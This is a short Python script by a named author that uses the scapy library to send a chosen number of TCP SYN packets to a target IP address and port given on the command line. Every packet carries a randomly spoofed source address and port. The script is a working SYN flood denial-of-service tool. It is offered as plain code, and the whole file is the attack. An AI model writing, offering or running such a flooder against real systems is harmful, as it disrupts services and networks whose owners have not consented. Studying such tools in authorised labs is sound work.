# Author: A. Dalerzoda
import sys  # Importing the module for command-line arguments
from scapy.all import *  # Importing scapy, a library for packet manipulation

def randomIP():  # Generates a random IP address with four components
    # Each component is created by converting a random integer (0-255) to a string
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))  # Constructing a random IP address
    return ip  # Returning the randomly generated IP address

def randPort():  # Generates a random port number between 0 and 64000
    x = random.randint(0, 64000)  # Generating a random port number
    return x  # Returning the randomly generated port number

# Command line arguments
dest_ip_address = sys.argv[1]  # Extracting destination IP address from command line argument index 1
dest_port = int(sys.argv[2])  # Extracting destination port number from command line argument index 2
pkt_count = int(sys.argv[3])  # Extracting the total number of packets from command line argument index 3

for i in range(0, pkt_count):  # Looping for the specified total packet count
    src_ip = randomIP()  # Generating a random source IP address for each iteration
    src_port = randPort()  # Generating a random source port number for each iteration

    packet = IP(src=str(src_ip), dst=dest_ip_address)  # Creating an IP header with the source and destination IP addresses
    segment = TCP(sport=src_port, dport=dest_port, flags="S")  # Creating a TCP packet with random source port, given
	# destination port, and the SYN flag for the three-way handshake
    pkt = packet/segment  # Combining the IP header and TCP packet
    send(pkt)  # Sending the combined TCP packet over the network
